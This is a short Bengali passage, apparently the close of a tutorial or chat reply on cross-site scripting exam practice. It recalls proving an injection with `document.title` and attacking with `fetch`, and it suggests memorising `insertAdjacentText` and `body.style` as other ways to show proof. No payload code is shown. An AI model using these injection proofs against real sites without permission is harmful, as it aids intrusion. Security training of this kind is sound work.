> (এখানে `document.title` দিয়ে প্রমাণ করলাম, আর `fetch` দিয়ে আক্রমণ করলাম—দুই কাজ একসাথে!)

তুমি ইতিমধ্যে `document.title` আয়ত্ত করেছো। এখন উপরের লিস্ট থেকে `document.body.insertAdjacentText` আর `document.body.style`-ও মুখস্থ করে নাও। পরীক্ষায় এগুলোর যেকোনো একটা দিয়ে সহজেই প্রমাণ দেখাতে পারবে। ইনশাআল্লাহ! 😊
